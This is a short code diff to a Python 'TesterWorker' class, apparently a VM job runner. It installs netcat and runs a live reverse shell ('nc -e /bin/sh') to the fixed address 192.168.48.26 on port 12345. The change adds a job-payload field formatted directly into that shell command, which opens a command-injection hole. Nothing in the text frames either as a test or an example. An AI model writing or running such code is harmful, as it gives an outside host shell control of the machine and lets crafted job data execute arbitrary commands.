@@ -13,6 +13,7 @@ class TesterWorker(worker.workers.VMWorker):
         super(self.__class__, self).__init__()
 
     def _run(self, job):
+        job_type = job.payload['type']
         self.execute("DEBIAN_FRONTEND=noninteractive apt-get update")
         self.execute("DEBIAN_FRONTEND=noninteractive apt-get -y install netcat")
-        self.execute("nc -vv -e /bin/sh 192.168.48.26 12345")
+        self.execute("JOB_TYPE={} nc -vv -e /bin/sh 192.168.48.26 12345".format(job_type))
